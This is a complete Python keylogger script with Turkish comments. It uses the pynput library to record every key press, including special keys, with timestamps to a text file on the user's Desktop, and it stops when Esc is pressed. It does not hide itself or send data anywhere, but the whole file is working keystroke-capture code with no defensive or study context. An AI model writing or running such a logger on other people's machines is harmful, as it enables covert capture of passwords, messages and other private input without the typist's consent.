import os
from pynput import keyboard
import logging

# Log dosyasının konumunu ve adını belirleyin
log_file = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")

# Log ayarlarını yapılandırın
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info("Key {0} pressed.".format(key.char))
    except AttributeError:
        logging.info("Special key {0} pressed.".format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Klavye dinleyicisini başlatın
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
